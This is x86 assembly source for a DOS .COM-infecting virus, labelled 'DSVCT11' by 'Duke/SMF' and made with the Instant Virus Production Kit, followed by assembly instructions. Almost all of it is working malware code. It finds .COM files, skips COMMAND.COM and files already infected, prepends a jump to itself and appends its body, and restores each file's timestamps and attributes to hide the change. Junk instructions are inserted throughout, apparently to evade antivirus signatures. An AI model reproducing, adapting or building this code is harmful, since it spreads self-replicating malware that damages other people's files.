   ;---------
   ;  IVP clone  written by Duke/SMF
   ;---------


   Code    Segment Public 'Code'
           Assume  CS:Code
           Org     100h                              ; All .COM files start here

   ID = 'DS'                                         ; Id for infected files

   Start:
           db     0e9h,2,0                           ; Jump to the next command
           dw     id                                 ; So this file doesnt get infected

   Virus:
           call    realcode                          ; Push current location on stack

   Realcode:
           nop
           nop
           nop
           nop
           pop     si                                ; Get location off stack
           nop
           nop
           sub     si,offset realcode                ; Adjust it for our pointer
           nop
           nop
           nop
           nop
           nop
           mov     bp,si                             ; Set up bp

    ADD DH,50
    SUB DH,50
           lea     si,[bp+offset oldjump]            ; Location of old jump in si
           mov     di,100h                           ; Restore new jump to 100h
    NOP
           push    di                                ; Save so we could just return when done
           movsb                                     ; Move a byte
           movsw                                     ; Move a word
           movsw                                     ; Move another word

    JMP DSVCT1
    DSVCT1:
           lea     dx,[bp+offset dta]                ; Where to put New DTA
           call    set_DTA                           ; Move it

    ADD BH,224
    SUB BH,224
           lea     dx,[bp+offset comfilespec]        ; Files to look for
    NOP
           call    findfirst

    MOV DX,199
           mov     dx,80h                            ; Location of original DTA
           call    set_dta                           ; Put it back there

    XOR DX,187
    XOR DX,187
           retn                                      ; Return to 100h (original jump)

   FindFirst:
           mov     ah,4eh                            ; Find first file
           mov     cx,7                              ; Find all attributes

   FindNext:
    XOR BX,178
    XOR BX,178
           int     21h                               ; Find first/next file int
           jc      quit                              ; If none found then change dir

    ADD CL,251
    SUB CL,251
           call    infection                         ; Infect that file

   FindNext2:
    MOV AH,48
           mov     ah,4fh                            ; Find next file
           jmp     findnext                          ; Jump to the loop

   Quit:
    ADD BX,53
    SUB BX,53
           ret

   Infection:
    MOV AX,93
           mov     ax,3d00h                          ; Open file for read only
    JMP DSVCT2
    DSVCT2:
           call    open

           mov     ah,3fh                            ; Read from file
           mov     cx,1ah                            ; Number of bytes
    XOR AX,33
    XOR AX,33
           lea     dx,[bp+offset buffer]             ; Location to store them
           int     21h

    MOV AH,204
           mov     ah,3eh                            ; Close file
           int     21h

    MOV AX,11
           mov     ax,word ptr [bp+DTA+35]           ; Get end of file name in ax
           cmp     ax,'DN'                           ; Does it end in 'ND'?
           jz      quitinfect                        ; Yup so get another file

   CheckCom:
    MOV BX,216
           mov     bx,word ptr [bp+offset dta+1ah]   ; Get file size
    ADD CL,36
    SUB CL,36
           cmp     word ptr cs:[bp+buffer+3],id      ; Check for ID
    NOP
           je      quitinfect

           jmp     infectcom

   QuitInfect:
    ADD BH,14
    SUB BH,14
           ret

   InfectCom:
    XOR BX,206
    XOR BX,206
           sub     bx,3                              ; Adjust for new jump
           lea     si,[bp+buffer]                    ; Move the old jump first
           lea     di,[bp+oldjump]
           movsb
           movsw
           movsw
           mov     [bp+buffer],byte ptr 0e9h         ; Setup new jump
           mov     word ptr [bp+buffer+1],bx         ; Save new jump

           mov     word ptr [bp+buffer+3],id         ; Put in ID
           mov     cx,5                              ; Number of bytes to write

    NOP
           jmp     finishinfection
   FinishInfection:
    JMP DSVCT3
    DSVCT3:
           push    cx                                ; save # of bytes to write
           xor     cx,cx                             ; Set attriutes to none
    XOR CX,119
    XOR CX,119
           call    attributes

    MOV AL,243
           mov     al,2                              ; open file read/write
           call    open

    MOV AH,138
           mov     ah,40h                            ; Write to file
           lea     dx,[bp+buffer]                    ; Location of bytes
    JMP DSVCT4
    DSVCT4:
           pop     cx                                ; Get number of bytes to write
    JMP DSVCT5
    DSVCT5:
           int     21h
    ADD CL,217
    SUB CL,217
           jc      closefile

    MOV AL,90
           mov     al,02                             ; Move Fpointer to eof
           Call    move_fp

           mov     ah,40h                            ; Write virus to file
           mov     cx,eof-virus                      ; Size of virus
    NOP
           lea     dx,[bp+offset virus]              ; Location to start from
           int     21h

   CloseFile:
           mov     ax,5701h                          ; Set files date/time back
           mov     cx,word ptr [bp+dta+16h]          ; Get old time from dta
           mov     dx,word ptr [bp+dta+18h]          ; Get old date
    JMP DSVCT6
    DSVCT6:
           int     21h

           mov     ah,3eh                            ; Close file
    XOR DX,254
    XOR DX,254
           int     21h

    XOR BX,47
    XOR BX,47
           xor     cx,cx
           mov     cl,byte ptr [bp+dta+15h]          ; Get old Attributes
    NOP
           call    attributes

    JMP DSVCT7
    DSVCT7:
           retn

   Move_Fp:
    MOV AH,172
           mov     ah,42h                            ; Move file pointer
           xor     cx,cx                             ; Al has location
           xor     dx,dx                             ; Clear these
           int     21h
           retn

   Set_DTA:
           mov     ah,1ah                            ; Move the DTA location
    JMP DSVCT8
    DSVCT8:
           int     21h                               ; DX has location
    JMP DSVCT9
    DSVCT9:
           retn

   Open:
           mov     ah,3dh                            ; open file
    NOP
           lea     dx,[bp+DTA+30]                    ; Filename in DTA
    ADD BL,211
    SUB BL,211
           int     21h
    NOP
           xchg    ax,bx                             ; put file handle in bx
           ret

   Attributes:
           mov     ax,4301h                          ; Set attributes to cx
           lea     dx,[bp+DTA+30]                    ; filename in DTA
    ADD BX,207
    SUB BX,207
           int     21h
    JMP DSVCT10
    DSVCT10:
           ret

   Virusname db '[DSVCT11]'                          ; Name Of The Virus
   Author    db 'Duke/SMF'                           ; Author Of This Virus
   messege:
             db '',10,13
   Made_with db '[IVP]',10,13,'$'                    ; Please do not remove this

   comfilespec  db  '*.com',0                        ; Holds type of file to look for
   oldjump      db  0cdh,020h,0,0,0                  ; Old jump.  Is int 20h for file quit

   EOF     equ     $                                 ; Marks the end of file

   DTA     db      42 dup (?)                        ; Location of new DTA
   Buffer db 1ah dup (?)                             ; Holds exe header

   eov     equ     $                                 ; Used For Calculations

   code    ends
           end     start


   ;---------
   ;  Instant Virus Production Kit By Admiral Bailey - Youngsters Against McAfee
   ;  To compile this use TASM /M FILENAME.ASM
   ;  Then type tlink /t FILENAME.OBJ
   ;---------
